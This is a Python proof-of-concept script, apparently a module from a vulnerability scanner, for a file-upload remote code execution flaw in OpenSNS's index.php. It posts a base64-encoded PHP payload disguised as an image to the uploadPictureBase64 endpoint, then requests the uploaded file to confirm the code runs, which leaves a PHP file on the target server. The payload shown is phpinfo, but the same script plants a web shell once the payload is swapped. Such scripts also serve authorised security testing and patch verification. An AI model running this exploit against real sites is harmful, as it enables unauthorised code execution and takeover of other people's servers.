#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: opensns index.php 前台getshell
referer: unknown
author: Lucifer
description: 文件index.php中,参数data base64解码getshell。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class opensns_index_getshell_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?s=/Core/File/uploadPictureBase64.html"
        post_data = {
            "data":"data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"
        }
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            pos = req.text.find("http:")
            shellurl = req.text[pos::].replace("\\","").strip('"}')
            req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req2.text:
                cprint("[+]存在opensns index.php 前台getshell漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshell地址: "+shellurl, "red")
                return True, vulnurl, "opensns index.php 前台getshell", payload, req.text
            else:
                cprint("[-]不存在opensns_index_getshell漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = opensns_index_getshell_BaseVerify(sys.argv[1])
    testVuln.run()